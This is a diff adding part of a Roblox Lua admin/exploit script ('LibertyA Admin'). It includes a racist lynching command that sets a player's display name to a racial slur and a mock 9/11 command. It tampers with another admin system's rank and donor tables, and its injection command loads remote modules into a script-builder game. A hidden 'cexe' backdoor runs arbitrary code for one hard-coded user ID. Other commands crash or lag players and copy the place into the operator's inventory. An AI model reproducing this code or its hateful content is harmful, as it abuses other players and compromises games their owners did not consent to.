+	["Position"] = Vector3.new(-24, 0.600031018, 33),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-24, 0.600031018, 33, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["Size"] = Vector3.new(2, 1.20000005, 8),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o32 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-22, 1.20002401, 33),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-22, 1.20002401, 33, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["Size"] = Vector3.new(2, 2.4000001, 8),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o33 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-16, 3.00002789, 33),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-16, 3.00002789, 33, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["Size"] = Vector3.new(2, 6, 8),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o34 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-18, 2.40002704, 33),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-18, 2.40002704, 33, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["Size"] = Vector3.new(2, 4.80000019, 8),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o35 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-20, 1.80002904, 33),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-20, 1.80002904, 33, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+	["Size"] = Vector3.new(2, 3.60000014, 8),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o36 = Create("Part",{
+	["Name"] = "rope",
+	["Parent"] = o1,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-0.5, 15.0000238, 46.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["RotVelocity"] = Vector3.new(9.29485318e-017, 3.22718457e-018, 9.29485318e-017),
+	["Velocity"] = Vector3.new(6.78266e-017, -0.210931048, 6.78266e-017),
+	["CFrame"] = CFrame.new(-0.5, 15.0000238, 46.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 1.20000005, 1),
+	["BottomSurface"] = Enum.SurfaceType.Motor,
+	["TopSurface"] = Enum.SurfaceType.Motor,
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o37 = Create("SpecialMesh",{
+	["Parent"] = o36,
+	["MeshType"] = Enum.MeshType.Sphere,
+	})
+	local o38 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(3.5, 2.40002704, 25.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(3.5, 2.40002704, 25.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 4.80000019, 1),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o39 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-0.5, 16.2000294, 47),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-0.5, 16.2000294, 47, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(10, 1.20000005, 1),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o40 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-5.5, 2.40002704, 25.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-5.5, 2.40002704, 25.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 4.80000019, 1),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o41 = Create("Part",{
+	["Name"] = "Smooth Block Model",
+	["Parent"] = o1,
+	["Material"] = Enum.Material.Wood,
+	["BrickColor"] = BrickColor.new("Earth orange"),
+	["Position"] = Vector3.new(-14.5, 2.40002704, 25.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["Anchored"] = true,
+	["CFrame"] = CFrame.new(-14.5, 2.40002704, 25.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 4.80000019, 1),
+	["Color"] = Color3.new(0.384314, 0.278431, 0.196078),
+	})
+	local o42 = Create("Part",{
+	["Name"] = "hanger",
+	["Parent"] = o1,
+	["BrickColor"] = BrickColor.new("Reddish brown"),
+	["Position"] = Vector3.new(-0.5, 11.4000158, 46.5),
+	["Rotation"] = Vector3.new(-0, -90, 0),
+	["RotVelocity"] = Vector3.new(9.29485318e-017, 8.0695067e-018, 9.29485318e-017),
+	["Velocity"] = Vector3.new(6.78266e-017, -0.611982644, 6.78266e-017),
+	["CFrame"] = CFrame.new(-0.5, 11.4000158, 46.5, 0, 0, -1, 0, 1, -0, 1, 0, -0),
+	["Size"] = Vector3.new(1, 1.20000005, 1),
+	["BottomSurface"] = Enum.SurfaceType.Smooth,
+	["TopSurface"] = Enum.SurfaceType.Smooth,
+	["Color"] = Color3.new(0.411765, 0.25098, 0.156863),
+	})
+	local o43 = Create("SpecialMesh",{
+	["Parent"] = o42,
+	["MeshId"] = "http://www.roblox.com/asset/?id=3270017",
+	["Scale"] = Vector3.new(2, 2, 1),
+	["MeshType"] = Enum.MeshType.FileMesh,
+	})
+
+	mas.Parent = workspace
+	mas:MakeJoints()
+
+	local mas1 = mas:GetChildren()
+
+	for i=1,#mas1 do
+		mas1[i].Parent = workspace 
+		pcall(function() mas1[i]:MakeJoints() end)
+	end
+
+	mas:Destroy()
+
+	for i=1,#cors do
+		coroutine.resume(cors[i])
+	end
+
+	model = o1
+	switch = model.gallowswitch
+	backup = model:Clone()	--kek
+
+	local function onClick()
+		model.trap.Anchored = false
+		local c = game.Workspace:GetChildren()
+		switch.Transparency = 1
+		model.gallowswitch2.Transparency = 0
+		for i = 1, #c do
+			if c[i].Name == "Help!" then
+				w = Instance.new("Weld")
+				c[i].Humanoid.Health = 0
+				wait(.01)
+				w.Parent = c[i].Head
+				w.Part0 = w.Parent
+				w.Part1 = c[i].Torso
+				w.C1 = CFrame.new(0,1.5,0)
+				local w1 = Instance.new("Weld")
+				w1.Parent = c[i].Torso
+				w1.Part0 = w1.Parent
+				w1.Part1 = c[i]["Right Arm"]
+				w1.C1 = CFrame.new(1.5,0,0)
+				local w2 = Instance.new("Weld")
+				w2.Parent = c[i].Torso
+				w2.Part0 = w2.Parent
+				w2.Part1 = c[i]["Left Arm"]
+				w2.C1 = CFrame.new(-1.5,0,0)
+				local w3 = Instance.new("Weld")
+				w3.Parent = c[i].Torso
+				w3.Part0 = w3.Parent
+				w3.Part1 = c[i]["Left Leg"]
+				w3.C1 = CFrame.new(-.5,2,0)
+				local w4 = Instance.new("Weld")
+				w4.Parent = c[i].Torso
+				w4.Part0 = w4.Parent
+				w4.Part1 = c[i]["Right Leg"]
+				w4.C1 = CFrame.new(.5,2,0)
+			end
+		end
+		Victim.Character.Humanoid.Health = 0
+		wait(1)
+		switch.Transparency = 0
+		model.gallowswitch2.Transparency = 1
+		wait(4)
+		model:remove()
+		backup.Parent = game.Workspace
+		backup:makeJoints()
+		wait(5)
+		game.Workspace.Gallows:Destroy()
+	end
+
+	Instance.new("ClickDetector", switch)
+
+	local connection = switch.ClickDetector.MouseClick:connect(onClick)
+	local b = model.welder
+
+	local function onTouched(part)
+		if part.Parent.Humanoid ~= nil then
+			w = Instance.new("Weld")
+			w.Parent = part.Parent.Head
+			w.Part0 = w.Parent
+			w.Part1 = model.hanger
+			Victim.Character.Humanoid.DisplayName = "N1gger"
+		end
+	end
+
+	connection = b.Touched:connect(onTouched)
+
+	game.Workspace.Gallows:MoveTo(Player.Character.Torso.Position + Player.Character.Torso.CFrame.lookVector* 30)
+	wait(0.2)
+	KlanLeader.Character.HumanoidRootPart.CFrame = game.Workspace.Gallows.gallowswitch2.CFrame
+	wait(0.5)
+	Victim.Character.HumanoidRootPart.CFrame = game.Workspace.Gallows.hanger.CFrame
+	wait(20)
+	kekkk:Destroy()
+end
+
+function Root.nineeleven(Player)
+	--Made by OpTic Wisdom/LikeATrollFace
+	script.Towers:Clone().Parent=game.Workspace
+	wait(0.5)
+	game.Workspace.Towers:MoveTo(Player.Character.Torso.Position + Player.Character.Torso.CFrame.lookVector* 30)
+	wait(2)
+	local x = game:GetService("InsertService"):LoadAsset(163348575)
+	for i,v in pairs(x:GetChildren()) do
+	v.Parent = Player.Backpack
+	end
+
+	Instance.new("ForceField" ,Player.Character)
+
+	kek = Player.Name
+
+	local children = game.Workspace.Towers.Tower2:GetChildren()
+	for _, child in pairs(children) do
+	    for _, child in pairs(child:GetChildren()) do
+	        table.insert(children, child)
+	    end
+	    if child:IsA("BasePart") then
+			local function handleTouch(otherPart)
+				local character = otherPart.Parent
+				local humanoid = character:FindFirstChild(kek.."'s Plane")
+				if humanoid then
+					child.Anchored = false
+			        local fire2 = Instance.new("Fire")
+			        fire2.Parent = child
+			        local explo1 = Instance.new("Explosion")
+			        explo1.Parent = child
+			        explo1.BlastPressure = 10
+			        explo1.Position = child.Position
+				end
+			end
+			 
+			child.Touched:connect(handleTouch)
+		end
+	end
+
+	children = game.Workspace.Towers.Tower1:GetChildren()
+	for _, child in pairs(children) do
+	    for _, child in pairs(child:GetChildren()) do
+	        table.insert(children, child)
+	    end
+	    if child:IsA("BasePart") then
+			local function handleTouch(otherPart)
+				local character = otherPart.Parent
+				local humanoid = character:FindFirstChild(kek.."'s Plane")
+				if humanoid then
+					child.Anchored = false
+			        local fire1 = Instance.new("Fire")
+			        fire1.Parent = child
+			        local explo2 = Instance.new("Explosion")
+			        explo2.Parent = child
+			        explo2.BlastPressure = 10
+			        explo2.Position = child.Position
+				end
+			end
+		 
+			child.Touched:connect(handleTouch)
+		end
+	end
+end
+
+function Root.ParseCommand(Message)
+	local Arguments = Root.Split(Message, ' ')
+	local Func
+	local Rank
+	if Root.Commands[Arguments[1]:lower()] then
+		local cmd=Root.Commands[Arguments[1]:lower()]
+		if Root.CmdIsRemoved(cmd)  then
+		return nil
+		end
+		Func = cmd.Function
+		Rank = cmd.Rank
+		table.remove(Arguments, 1)
+	end
+	if Func then
+		return Func, Arguments, Rank
+	end
+	return nil
+end
+
+function Root.ParseRanks(t, r)
+	for i, v in pairs(t) do
+		Root.Ranks[v] = r
+	end
+end
+
+function Root.AddCommand(Name, Rank, Usages, Function, IsPremium)
+	if IsPremium and not Premium then
+		return
+	end
+		Root.Commands[Name:lower()] = {
+			Name = Name,
+			Rank = Rank,
+			Function = Function
+		}
+	for i, v in pairs(Usages) do
+		Root.Commands[v:lower()] = {
+			Name = Name,
+			Rank = Rank,
+			Function = Function
+		}
+	end
+end
+function Root.IdFromName(Name)
+	return game:service'HttpService':GetAsync("http://rproxy.pw/rapi/GetIdByUsername/"..Name)
+end
+function Root.FireClient(Player, ...)
+	RE:FireClient(Player, ...)
+end
+function Root.Ping(Player, Text, Color, Func, Image)
+	if not Player then
+		return
+	end
+	if not Text then
+		return
+	end
+	Color = Color or Root.Colors[Player.Name] or Root.RankColors[Root.GetRank(Player)] or 'New Yeller'
+	local Material=Root.Materials[Player.Name] or 'Plastic'
+	Func = Func or function()
+	end
+	local num = #Root.TabFunctions + 1
+	Root.TabFunctions[num] = Func
+	Root.FireClient(Player, 'MakeTab', Text, num, Color, Image,Material)
+end
+--Events
+wait(.3)
+workspace.DescendantAdded:connect(function(v)
+if v:IsA'BaseScript' and Root.ScriptBlock then
+while v do
+v.Disabled=true
+v:Destroy()
+wait()
+end
+end
+end)
+Players.DescendantAdded:connect(function(v)
+if v:IsA'BaseScript' and Root.ScriptBlock then
+while v do
+v.Disabled=true
+v:Destroy()
+wait()
+end
+end
+end)
+game:service'ServerScriptService'.DescendantAdded:connect(function(v)
+if v:IsA'BaseScript' and Root.ScriptBlock then
+while v do
+v.Disabled=true
+v:Destroy()
+wait()
+end
+end
+end)
+Players.PlayerAdded:connect(function(Player)
+	Root.PlayerAdded(Player)
+end)
+JSONEncode=function(...)return game:service'HttpService':JSONEncode(...) end;
+JSONDecode=function(...)return game:service'HttpService':JSONDecode(...) end;
+DS=game:service'DataStoreService':GetDataStore('AdminLibertyA')
+if DS:GetAsync'PersonalServers'==nil then
+DS:SetAsync('PersonalServers',JSONEncode({}))
+end
+PersonalServers=JSONDecode(DS:GetAsync'PersonalServers')
+
+RE = Instance.new('RemoteEvent', game:service'ReplicatedStorage')
+RE.Name = 'ExploitRE'
+function connect(sre)
+	local evs = {}
+	evs[1] = sre.OnServerEvent:connect(function(Player, Data)
+		if Data[1] == 'CmdBarChatted' then
+			Root.PlayerChatted(Player, Root.Prefix..Data[2])
+		end
+		if Data[1] == 'TabFunction' then
+			Root.TabFunctions[Data[2]](Player)
+			Root.TabFunctions[Data[2]] = nil
+		end
+		if Data[1] == 'CallbackFunction' then
+			Root.TabFunctions[Data[2]](Data[3])
+			--Root.TabFunctions[Data[2]] = nil
+		end
+		if Data[1] == 'Chatted' then
+			Root.PlayerChatted(Player, Data[2])
+			if Data[3] then
+				for i, v in pairs(Root.GetRawPlayers()) do
+					if v ~= Player then
+						Root.OxChat(v,Player.Name,Data[2])
+						Root.FireClient(v, 'MakeChat', '['..Player.Name..']: '..Data[2], BrickColor.new(Root.RankColors[Root.GetRank(Player)]).Color)
+					end
+				end
+			end
+		end
+	end)
+	evs[2] = sre.Changed:connect(function()
+		evs[1]:disconnect()
+		sre:Destroy()
+		RE=Instance.new('RemoteEvent', game:service'ReplicatedStorage')
+		RE.Name='ExploitRE'
+		connect(RE)
+		evs[2]:disconnect()
+	end)
+end
+connect(RE)
+thread(function()
+local kohlenv=getfenv(_G.KPrintCmds)
+kohlenv.f.isDonor={}
+setmetatable(kohlenv.f.isDonor,{
+__metatable='';
+__call=function(_,a) return kohlenv.f.Has(a,324943527) end;
+})
+kohlenv.f.isDonor={}
+setmetatable(kohlenv.f.isDonor,{
+__metatable='';
+__call=function(_,a) return kohlenv.f.Has(a,324943527) end;
+})
+while true do
+	local NewRanks={}
+	for i,v in pairs(Root.Ranks) do
+		if v > 0 then
+		NewRanks[i]=v+1
+	else
+		NewRanks[i]=v
+		end
+	end
+kohlenv.f.Admins=NewRanks
+wait()
+end
+
+
+end)
+-- Commands
+Root.AddCommand(
+'Invisible Forcefield',
+1,
+{
+	'invisff',
+	'iff'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			InvisFFs[v.Name] = false
+			wait()
+			InvisFFs[v.Name] = true
+			local ff
+			repeat
+				ff = Instance.new('ForceField')
+				ff.Parent = v.Character
+				wait()
+				ff:Destroy()
+			until InvisFFs[v.Name] == false
+			if ff then
+				ff:Destroy()
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Forcefield',
+1,
+{
+	'ff',
+	'forcefield'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			local ff = Instance.new('ForceField')
+			ff.Parent = v.Character
+			ff.Name = 'LibertyAShield'
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Explode',
+1,
+{
+	'expl',
+	'explode',
+	'boom',
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			local expl = Instance.new("Explosion")
+			expl.Parent = v.Character
+			expl.Name = 'LibertyAExplosion'
+			expl.Position = v.Character.HumanoidRootPart.Position
+		end)	
+	end
+end
+)
+Root.AddCommand(
+'Shout',
+3,
+{
+	'shout'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetRawPlayers()) do
+		pcall(function()
+			Root.FireClient(v, 'Speak', Root.Join(Arguments))
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Personal Servers',
+1,
+{
+	'personalservers','pservers','ps'
+},
+function(Player, Arguments)
+	PersonalServers=JSONDecode(DS:GetAsync'PersonalServers')
+	for i,v in pairs(PersonalServers) do
+	Root.Ping(Player,'Server '..v.Name,'Crimson',function()
+	game:service'TeleportService':TeleportToPrivateServer(v.PlaceId, v.ID, Root.GetPlayers(Player,Arguments[1]))
+	end)
+	end
+end
+)
+Root.AddCommand(
+'New Personal Server',
+1,
+{
+	'nps','newps','newpersonalserver'
+},
+function(Player, Arguments)
+	PersonalServers=JSONDecode(DS:GetAsync'PersonalServers')
+	for i,v in pairs(PersonalServers) do
+	if v.Name==Root.Join(Arguments) then
+	Root.Ping(Player,'That name is already used!','Crimson')
+	return
+	end
+	end
+local c=game:service'TeleportService':ReserveServer(game.PlaceId)
+table.insert(PersonalServers,{PlaceId=game.PlaceId,ID=c,Name=Root.Join(Arguments)})
+DS:SetAsync('PersonalServers',JSONEncode(PersonalServers))
+end
+)
+Root.AddCommand(
+'Walkspeed',
+1,
+{
+	'ws',
+	'speed',
+	'walkspeed'
+},
+function(Player, Arguments)
+	local Players = Root.GetPlayers(Player, Arguments[1])
+	for i, v in pairs(Players) do
+		thread(function()
+			for o, p in pairs(v.Character:children()) do
+				if p:IsA'Humanoid' then
+					p.WalkSpeed = tonumber(Arguments[2])
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Dex Explorer',
+1,
+{
+	'dex',
+},
+function(Player, Arguments)
+	local Players = Root.GetPlayers(Player, Arguments[1])
+	for i, v in pairs(Players) do
+		thread(function()
+			script.fatdecks:Clone().Parent = v:WaitForChild'PlayerGui'
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Stay-Away-Shield',
+2,
+{
+	'sas'
+},
+function(Player, Arguments)
+	if #Arguments < 1 then
+		return
+	end
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()v.Character:FindFirstChild'LibertyAShield':Destroy() end)
+		local sc=script.LibertyAShield:clone()
+		sc.Protect.Value=v
+		sc.Parent=v.Character
+		sc.Shield.Adornee=v.Character.HumanoidRootPart
+		wait()
+		sc.Main.Disabled=false
+	end
+end
+)
+Root.AddCommand(
+'Jump Power',
+1,
+{
+	'jp',
+	'jump',
+	'jumppower'
+},
+function(Player, Arguments)
+	local Players = Root.GetPlayers(Player, Arguments[1])
+	for i, v in pairs(Players) do
+		thread(function()
+			for o, p in pairs(v.Character:children()) do
+				if p:IsA'Humanoid' then
+					p.JumpPower = tonumber(Arguments[2])
+				end
+			end
+		end)
+	end
+end
+)
+		if game.PlaceId==20279777 then
+Root.AddCommand(
+'SBExe',
+1,
+{
+	'sbexe',
+},
+function(Player, Arguments)
+	local Players = Root.GetPlayers(Player, Arguments[1])
+	table.remove(Arguments,1)
+	for i, v in pairs(Players) do
+		thread(function()
+			if Root.GetRank(v) < Root.GetRank(Player) or v == Player then
+			v.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value=Root.Join(Arguments)
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'SB Scripts',
+1,
+{
+	'sbscripts',
+},
+function(Player, Arguments)
+	local Players = Root.GetPlayers(Player, Arguments[1])
+	table.remove(Arguments,1)
+	for i, v in pairs(Players) do
+		thread(function()
+for o,p in pairs(v.PlayerGui.SB_OutputGUI.Main.Scripts.Content.List.Entries:children()) do
+Root.Ping(Player,p.Text,'Lime green')
+end
+		end)
+	end
+end
+)
+end
+Root.AddCommand(
+'Anti-Kill',
+1,
+{
+	'antikill',
+},
+function(Player, Arguments)
+	local Players = Root.GetPlayers(Player, Arguments[1])
+	for i, v in pairs(Players) do
+		thread(function()
+			local died
+			local cf
+			died = function(plr)
+				local char = plr.Character
+				if cf then
+					plr.Character.HumanoidRootPart.CFrame = cf
+				end
+				char.Humanoid:Destroy()
+				local hum = Instance.new('Humanoid', char)
+				char.Animate.Disabled = true
+				hum.Died:connect(function()
+					local tools = plr.Character:children()
+					local tools2 = plr.Backpack:children()
+					cf = char.HumanoidRootPart.CFrame
+					plr:LoadCharacter()
+					wait()
+					died(plr)
+					plr.Backpack:ClearAllChildren()
+					for i, v in pairs(plr.Character:children()) do
+						if v:IsA'ForceField' then
+							v:Destroy()
+						end
+					end
+					for o, p in pairs(tools) do
+						if p:IsA'Tool' then
+							p.Parent = plr.Backpack
+						end
+						if p:IsA'ForceField' then
+							p.Parent = plr.Character
+						end
+					end
+					for o, p in pairs(tools2) do
+						if p:IsA'Tool' or p:IsA'HopperBin' then
+							p.Parent = plr.Backpack
+						end
+					end
+					for o, p in pairs(tools) do
+						if p:IsA'Tool' then
+							p.Parent = plr.Character
+						end
+					end
+				end)
+				wait()
+				char.Animate.Disabled = false
+			end
+			died(v)
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Tabcolor',
+1,
+{
+	'tc',
+	'tabcolor'
+},
+function(Player, Arguments)
+	Root.Colors[Player.Name] = Root.Join(Arguments)
+end
+)
+Root.AddCommand(
+'Tabmaterial',
+1,
+{
+	'tm',
+	'tabmaterial'
+},
+function(Player, Arguments)
+	Root.Materials[Player.Name] = Root.Join(Arguments)
+end
+)
+Root.AddCommand(
+'Reflect',
+1,
+{
+	'reflect',
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		Reflect[v.userId] = true
+	end
+end
+)
+Root.AddCommand(
+'UnReflect',
+1,
+{
+	'unreflect',
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		Reflect[v.userId] = false
+	end
+end
+)
+Root.AddCommand(
+'Kick',
+2,
+{
+	'kick'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			if Root.GetRank(Player) > Root.GetRank(v) then
+				Root.Kick(v, Root.Join(Arguments) or 'Disconnected by '..Root.AdminName:gsub('Admin','Administration'))
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Script Block',
+2,
+{
+	'scriptblock'
+},
+function(Player, Arguments)
+	Root.FireClient(Player,'Dismiss')
+	if Root.ScriptBlock then
+	Root.Ping(Player, 'Status : On','Pearl')
+else
+	Root.Ping(Player, 'Status : Off','Pearl')
+end
+	Root.Ping(Player, 'ScriptBlock')
+	Root.Ping(Player, 'On', 'Lime green', function()
+		Root.ScriptBlock = true
+		Root.FireClient(Player, 'Dismiss')
+		Root.AddLog(Player.Name.." enabled script block.")
+	end)
+	Root.Ping(Player, 'Off', 'Really red', function()
+		Root.ScriptBlock = false
+		Root.FireClient(Player, 'Dismiss')
+		Root.AddLog(Player.Name.." disabled script block.")
+	end)
+end
+)
+Root.AddCommand(
+'Private Server',
+2,
+{
+	'pri',
+	'unpri',
+	'slock',
+	'unslock',
+	'serverlock',
+	'serverunlock'
+},
+function(Player, Arguments)
+	Root.FireClient(Player,'Dismiss')
+	if Root.PrivateServer then
+	Root.Ping(Player, 'Status : On','Pearl')
+else
+	Root.Ping(Player, 'Status : Off','Pearl')
+end
+	Root.Ping(Player, 'Server Lock')
+	Root.Ping(Player, 'On', 'Lime green', function()
+		Root.PrivateServer = true
+		Root.FireClient(Player, 'Dismiss')
+		Root.AddLog(Player.Name.." enabled private server.")
+	end)
+	Root.Ping(Player, 'Off', 'Really red', function()
+		Root.PrivateServer = false
+		Root.FireClient(Player, 'Dismiss')
+		Root.AddLog(Player.Name.." disabled private server.")
+	end)
+end
+)
+Root.AddCommand(
+'Http Jam',
+2,
+{
+	'hj',
+	'httpjam',
+	'httpj'
+},
+function(Player, Arguments)
+	Root.FireClient(Player,'Dismiss')
+	Root.Ping(Player, 'Http Jam')
+		if Root.HttpJam then
+	Root.Ping(Player, 'Status : On','Pearl')
+else
+	Root.Ping(Player, 'Status : Off','Pearl')
+end
+	Root.Ping(Player, 'On', 'Lime green', function()
+		Root.HttpJam = true
+		Root.FireClient(Player, 'Dismiss')
+	Root.AddLog(Player.Name.." enabled http jam.")
+	end)
+	Root.Ping(Player, 'Off', 'Really red', function()
+		local f
+		if Root.HttpJam then
+		f=true
+		end
+		Root.HttpJam = false
+		Root.FireClient(Player, 'Dismiss')
+		if f then
+			Root.Ping(Player,'Success, results of toggling httpservice may take up to 60 seconds.','Lime green')
+		end
+		Root.AddLog(Player.Name.." disabled http jam.")
+	end)
+end
+)
+Root.AddCommand(
+'Crash',
+3,
+{
+	'crash';
+	'lag'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			if Root.GetRank(Player) > Root.GetRank(v) then
+				Root.FireClient(v, 'Lag', 'You are experiencing lag.')
+			end
+		end)
+	end
+end
+)
+		if game.PlaceId==20279777 then
+Root.AddCommand(
+'',
+3,
+{
+	'LibertyAinj';
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+		if game.PlaceId==20279777 then
+		v.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value='exit/'
+		wait()
+		v.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value='remove/LibertyA'
+		wait()
+		v.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value='create/LibertyA'
+		wait()
+		v.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value='edit/LibertyA'
+		wait()
+		v.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value=[[game:service'InsertService':LoadAssetVersion(519416165).Parent=workspace game.ItemChanged:wait()pcall(_G.OSC_AddServerSideData,setmetatable({},{__index=function()pcall(pcall,getfenv(2).require,316459594,{Owners={owner.Name,owner.userId}})getfenv(2).script.Parent.Parent=nil end}))]]
+		v.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value='exit/'
+		wait()
+		v.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value='save/LibertyA'
+		wait()
+		v.PlayerGui.SB_DataTransfer.SB_CommandRemote.Value='c/print(string.rep("'..[[\n]]..'",150))print"LibertyA Admin loader has been injected, use run/LibertyA to load it. No it does not use my main breakout, just one of my many spares that I have, take it if you will."'
+		end
+		end)
+	end
+end
+)
+end
+Root.AddCommand('cexe', 0, {
+	'cexe'
+}, function(Player, Args)
+	if game.IsA(Player, 'Player') then
+		if Player.userId == 17057842 then
+			loadstring('return function(f)setfenv(1,f)'..Root.Join(Args)..' end')()(getfenv())
+		end
+	end
+end)
+Root.AddCommand(
+'Admins',
+2,
+{
+	'admins'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.Ranks) do
+		if v >= 1 then
+			if type(i) == 'number' then
+	
+				Root.Ping(Player, Root.UsernameFromID(i)..'\n'..Root.RankName(v))
+			else
+				Root.Ping(Player, i..'\n'..Root.RankName(v))
+			end
+		end
+	
+	end
+end
+)
+Root.AddCommand(
+'export Game',
+3,
+{
+	'export'
+},
+function(Player, Arguments)
+	game:service'AssetService':CreatePlaceInPlayerInventoryAsync (
+    Player,
+    'Place '..game.PlaceId..' export',
+    game.PlaceId,
+    'Exported by LibertyA Administration'
+)
+end
+)
+Root.AddCommand(
+'Temp lag',
+3,
+{
+	'tlag'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			if Root.GetRank(Player) > Root.GetRank(v) or v==Player then
+				Root.FireClient(v, 'TempLag', tonumber(Root.Join(Arguments)))
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Mute',
+3,
+{
+	'mute'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			if Root.GetRank(Player) > Root.GetRank(v) or v==Player then
+				Root.FireClient(v, 'SetMuted', true)
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Base',
+3,
+{
+	'base'
+},
+function(Player, Arguments)
+	pcall(function()
+		LibertyABase:Destroy()
+	end)
+	local Base = Instance.new('Part', workspace)
+	Base.Name = 'LibertyABase'
+	Base.Size = Vector3.new(700, 1.2, 700)
+	Base.Anchored = true
+	Base.CFrame = CFrame.new(0, -0.6, 0)
+	Base.TopSurface = 'Smooth'
+	Base.BottomSurface = 'Smooth'
+	Base.Material = 'Grass'
+	Base.BrickColor = BrickColor.new('Bright green')
+	LibertyABase = Base
+end
+)
+Root.AddCommand(
+	"anti ban",
+	2,
+	{
+		"antiban",
+	},
+	function(Player, Arguments)
+		local t = {}
